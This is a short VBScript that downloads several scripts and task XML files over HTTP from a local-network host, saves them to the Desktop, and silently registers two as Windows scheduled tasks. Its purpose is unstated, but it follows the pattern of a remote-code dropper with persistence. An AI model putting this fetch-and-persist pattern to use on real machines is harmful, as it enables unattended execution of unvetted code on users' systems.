Set objShell = CreateObject("Wscript.Shell")
Set objXML   = CreateObject("MSXML2.XMLHTTP")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

' Get Desktop path
desktopPath = objShell.SpecialFolders("Desktop")

' Define files to download
ip = "192.168.1.102"
files = Array("GG.ps1", "windows-sht.py", "launch.vbs", "gg.xml", "SendSystem.xml")

For Each filename In files
    url = "http://" & ip & ":3000/api/install/" & ip & "/" & filename
    localPath = desktopPath & "\" & filename

    ' Download file
    objXML.Open "GET", url, False
    objXML.Send

    If objXML.Status = 200 Then
        ' Save binary-safe
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' Binary
        objStream.Open
        objStream.Write objXML.ResponseBody
        objStream.SaveToFile localPath, 2 ' Overwrite if exists
        objStream.Close
    Else
        MsgBox "Failed to download " & filename & " (" & objXML.Status & ")"
    End If
Next

' Register tasks from downloaded XML
taskFiles = Array("gg.xml", "SendSystem.xml")

For Each taskFile In taskFiles
    taskPath = desktopPath & "\" & taskFile
    taskName = Replace(taskFile, ".xml", "") ' Use filename as task name
    cmd = "schtasks /Create /TN """ & taskName & """ /XML """ & taskPath & """ /F"
    objShell.Run "cmd /c " & cmd, 0, True
Next

MsgBox "Scripts downloaded and tasks imported."
